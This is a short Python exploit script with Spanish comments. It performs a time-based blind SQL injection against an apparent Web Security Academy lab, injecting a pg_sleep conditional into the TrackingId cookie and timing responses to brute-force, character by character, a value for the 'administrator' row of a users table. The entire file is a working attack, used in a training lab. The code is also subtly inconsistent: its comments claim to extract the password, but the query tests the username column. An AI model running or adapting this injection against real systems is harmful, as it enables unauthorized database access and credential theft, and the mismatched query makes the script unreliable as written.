#!/bin/python3
from pwn import *
import sys,time,signal,string,pdb,requests

#Salida de emergencia [ctl+c]
def handler(signal,frame):
    print('\n\n[!]Saliendo...\n')
    sys.exit(1) #Salida erronea pq el programa no termina su funcionamiento normal al hacer ctl+c
    

signal.signal(signal.SIGINT,handler) #ctl+c en si, [signal.SIGINT], handler la funcion de arriba

main_url='https://0a71006a04fe8b0bc002d13e00fc0069.web-security-academy.net'
diccionario= string.ascii_lowercase + string.digits

def attack(): 
    contra = ''

    pl = log.progress("Fuerza bruta")
    pl.status("Iniciando ataque de fuerza bruta")
    
    time.sleep(2)# simplemente para alcanzar a leer el status en la consola 

    pl2= log.progress("Password")
    
    

    for position in range(1,21): # Para iterar en cada posicion o caracter de la password, desde 1 a 20 en este caso, determinado por la funcion 
        for iterator in diccionario:#Para hacer la fuerza bruta en cada caracter, se itera el diccionario completo hasta encontrar el caracter correcto
            cookies = {
                'TrackingId': "deZoQ63hWCU5lPt1'||(select case when substring(username,%d,1)='%s' then pg_sleep(3) else pg_sleep(0) end from users where username='administrator')-- -'" % (position,iterator),
                'session': 'fAT8uVJaSNSjOSzNWIlLocGZyFgwizxx'
                }
            
            pl.status(cookies['TrackingId'])

            pretime= time.time()

            r = requests.get(main_url,cookies=cookies)

            postime= time.time()
            
            if(postime-pretime) > 3:
                contra += iterator# Si la query es correcta suma el caracter correcto a la password 
                pl2.status(contra)# muestra el avance de la password 
                break




if __name__== '__main__':
    attack()